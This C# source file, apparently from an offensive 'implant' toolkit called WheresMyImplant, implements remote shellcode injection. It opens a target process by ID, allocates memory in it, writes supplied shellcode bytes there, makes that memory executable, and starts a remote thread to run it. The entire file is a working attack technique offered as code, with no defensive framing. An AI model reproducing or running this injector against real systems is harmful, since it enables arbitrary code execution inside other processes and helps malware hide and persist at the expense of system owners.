using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    internal class InjectShellCodeRemote : Base
    {
        internal InjectShellCodeRemote(String shellCodeString, UInt32 processId)
        {
            const char DELIMITER = ',';
            string[] shellCodeArray = shellCodeString.Split(DELIMITER);
            byte[] shellCodeBytes = new Byte[shellCodeArray.Length];

            for (int i = 0; i < shellCodeArray.Length; i++)
            {
                int value = (int)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                shellCodeBytes[i] = Convert.ToByte(value);
            }

            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral("Attempting to get handle on " + processId);
            IntPtr hProcess = kernel32.OpenProcess(kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ, false, processId);
            WriteOutputGood("Handle: " + hProcess.ToString("X4"));

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)shellCodeBytes.Length;
            WriteOutputNeutral("Attempting to allocate memory");
            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.PAGE_READWRITE);
            WriteOutputGood("Allocated " + dwSize + " bytes at " + lpBaseAddress.ToString("X4"));
            WriteOutputGood("Memory Protection Set to PAGE_READWRITE");  

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpNumberOfBytesWritten = 0;
            GCHandle pinnedArray = GCHandle.Alloc(shellCodeBytes, GCHandleType.Pinned);
            IntPtr shellCodeBytesPtr = pinnedArray.AddrOfPinnedObject();
            WriteOutputNeutral("Attempting to write process memory");
            Boolean writeProcessMemoryResult = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, shellCodeBytesPtr, (UInt32)shellCodeBytes.Length, ref lpNumberOfBytesWritten);
            WriteOutputGood("Wrote " + dwSize + " bytes");

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpflOldProtect = 0;
            WriteOutputNeutral("Attempting to Alter Memory Protections to PAGE_EXECUTE_READ");
            Boolean test = kernel32.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
            WriteOutputGood("Set Memory Protection to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            WriteOutputNeutral("Attempting to start remote thread");
            IntPtr hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
            WriteOutputGood("Started Thread: " + hThread);
            
            ////////////////////////////////////////////////////////////////////////////////
            kernel32.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
        }
    }
}